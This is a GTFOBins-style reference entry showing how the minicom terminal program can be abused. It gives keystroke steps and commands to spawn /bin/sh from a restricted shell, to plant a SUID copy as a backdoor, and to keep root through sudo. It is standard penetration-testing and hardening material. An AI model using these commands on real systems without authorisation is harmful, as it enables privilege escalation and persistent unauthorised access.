# GTFOBin: minicom

Note that in some versions, `Meta-Z` is used in place of `Ctrl-A`.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

Start the following command to open the TUI interface, then:

1. press `Ctrl-A o` and select `Filenames and paths`;
2. press `e`, type `/bin/sh`, then `Enter`;
3. Press `Esc` twice;
4. Press `Ctrl-A k` to drop the shell.
After the shell, exit with `Ctrl-A x`.

```
minicom -D /dev/null
```

After the shell, exit with `Ctrl-A x`.

```
TF=$(mktemp)
echo "! exec /bin/sh <$(tty) 1>$(tty) 2>$(tty)" >$TF
minicom -D /dev/null -S $TF
reset^J
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

Start the following command to open the TUI interface, then:

1. press `Ctrl-A o` and select `Filenames and paths`;
2. press `e`, type `/bin/sh -p`, then `Enter`;
3. Press `Esc` twice;
4. Press `Ctrl-A k` to drop the shell.
After the shell, exit with `Ctrl-A x`.

```
sudo install -m =xs $(which minicom) .

./minicom -D /dev/null
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

Start the following command to open the TUI interface, then:

1. press `Ctrl-A o` and select `Filenames and paths`;
2. press `e`, type `/bin/sh`, then `Enter`;
3. Press `Esc` twice;
4. Press `Ctrl-A k` to drop the shell.
After the shell, exit with `Ctrl-A x`.

```
sudo minicom -D /dev/null
```